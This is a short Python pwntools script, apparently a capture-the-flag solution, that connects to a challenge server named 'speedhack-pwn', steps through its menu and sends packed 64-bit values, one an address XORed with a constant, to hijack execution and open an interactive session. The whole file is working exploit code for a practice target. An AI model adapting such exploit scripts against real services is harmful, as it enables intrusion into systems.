from pwn import *

#c4n_i_j0in_theori?
#r=process("speedypwn_c743765c8f6d2fcfc0eabde9315f4a9b")
r=remote("speedhack-pwn-13935cd1502a01e8890ec92ac920528c.theori.io",8171)
r.recvuntil(">")


r.sendline(str(1))
r.sendline("FUCK")

r.recvuntil(">")
r.sendline(str(2))
r.recvuntil(">")
r.sendline(str(3))
sleep(1)
r.sendline(str(16))
sleep(2)
r.send(p64(0x41DEBF43)+p64(0x0000000000400837^0x213141516171))
r.sendline(str(1))
r.interactive()
